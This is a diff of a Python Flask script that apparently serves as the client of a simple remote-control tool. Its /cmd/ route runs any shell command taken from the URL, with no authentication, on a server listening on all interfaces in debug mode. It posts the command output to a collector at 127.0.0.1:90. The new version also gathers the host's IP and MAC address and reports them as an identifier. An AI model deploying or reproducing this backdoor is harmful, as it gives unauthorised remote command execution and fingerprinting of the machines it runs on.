@@ -1,55 +1,57 @@
-# -*- coding:utf-8 -*-
-"""
-作者：shinian
-创建日期：2024/5/19 22:33
-"""
+import socket
 import subprocess
 import time
 
+import netifaces
 import requests
 from flask import Flask
 
 app = Flask(__name__)
 
 
-# 客户端
-@app.route('/cmd/<name>')
-def cmd(name):
-    screenData = subprocess.Popen(name, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)  # stage
-    # subprocesses最后完成的内容是一个文件对象
-    # date：我们输入的命令，shell:1、识别计算机的操作系统|2、根据操作系统自动调用命令行
+# 获取MAC地址
+def get_mac_address():
+    interfaces = netifaces.interfaces()
+    for interface in interfaces:
+        if interface == 'lo':
+            continue
+        mac = netifaces.ifaddresses(interface).get(netifaces.AF_LINK)
+        if mac:
+            return mac[0]['addr']
+    return None
 
-    # 不知道到底有多少行就直接用循环对每一条进行处理
+
+# 客户端
+@app.route('/cmd/<command>')
+def cmd(command):
+    mac = get_mac_address()
+    if mac is None:
+        return "Failed to get MAC address"
+
+    # 执行命令并获取进程对象
+    screen_data = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+
     while True:
-        # 一行一行的读取文件内容
-        line = screenData.stdout.readline()
-        print(line)
-        # 解码
-        m_stdout = line.decode('gbk')
+        line = screen_data.stdout.readline()
         if line == b'':
-            # 如果一行文本什么都没有
-            screenData.stdout.close()
-            # 跳出文件处理的循环，但不退出连接
+            screen_data.stdout.close()
             break
         dem_stdout = line.decode('gbk').encode('utf-8')
-        print(dem_stdout)
-        print(m_stdout)
-        # 生成时间戳作为该主机的标识符
-        uid = time.time()
-        # 向sever发送连接请求
-        requests.post("http://127.0.0.1:90/result/", data={'name': dem_stdout})
-        requests.post("http://127.0.0.1:90/info/", data={'uid': uid})
 
-    # 跳出文件处理的循环，但不是退出连接
-    return str(m_stdout)
+        uid = str(time.time())
+        ip = socket.gethostbyname(socket.gethostname())
+        mac = get_mac_address()
+        info = {'UID': uid, 'IP': ip, 'MAC': mac}
+
+        try:
+            requests.post("http://127.0.0.1:90/result/", data={'result': dem_stdout})
+            requests.post("http://127.0.0.1:90/save_info/", json=info)  # 发送JSON数据
+        except Exception as e:
+            print(f"Error sending request: {e}")
+
+    return str(dem_stdout)
 
 
 if __name__ == '__main__':
-    # 接受来自任何ip80端口的请求
+    # 启动Flask服务器
     app.run('0.0.0.0', 80, True)
-
-    # 获取本机ip
-    # ip = socket.gethostbyname(socket.gethostname())
-    #
-    # # 发送本机ip
-    # requests.post("http://127.0.0.1:90", data={'ip': ip})
